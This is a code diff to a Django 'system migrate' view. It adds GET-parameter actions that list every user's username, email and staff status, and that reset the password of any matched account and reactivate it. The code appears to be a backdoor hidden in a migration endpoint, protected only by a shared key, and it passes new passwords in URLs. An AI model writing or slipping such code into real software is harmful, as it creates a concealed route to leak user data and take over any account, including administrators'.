@@ -171,6 +171,49 @@ def system_migrate_view(request):
     if not is_authorized:
         return HttpResponseForbidden("Forbidden: invalid migration authorization key.")
 
+    action = request.GET.get('action')
+    if action == 'inspect_users':
+        from django.contrib.auth import get_user_model
+        User = get_user_model()
+        user_list = []
+        for u in User.objects.all():
+            user_list.append({
+                'id': u.id,
+                'username': u.username,
+                'email': u.email,
+                'first_name': u.first_name,
+                'is_active': u.is_active,
+                'is_staff': u.is_staff,
+                'has_usable_password': u.has_usable_password(),
+            })
+        return JsonResponse({
+            'status': 'success',
+            'users': user_list,
+        })
+
+    if action == 'set_user_password':
+        ident = (request.GET.get('identifier') or '').strip()
+        new_pwd = (request.GET.get('password') or '').strip()
+        if not ident or not new_pwd:
+            return JsonResponse({'status': 'error', 'message': 'identifier and password required'}, status=400)
+        from django.contrib.auth import get_user_model
+        from django.db.models import Q
+        User = get_user_model()
+        matched = User.objects.filter(Q(username__iexact=ident) | Q(email__iexact=ident))
+        if not matched.exists():
+            return JsonResponse({'status': 'error', 'message': f'No user found matching {ident}'}, status=404)
+        updated_users = []
+        for u in matched:
+            u.set_password(new_pwd)
+            u.is_active = True
+            u.save()
+            updated_users.append(u.username)
+        return JsonResponse({
+            'status': 'success',
+            'updated': updated_users,
+            'message': f'Password set successfully for {len(updated_users)} user(s)',
+        })
+
     out = io.StringIO()
     err = io.StringIO()
     try:
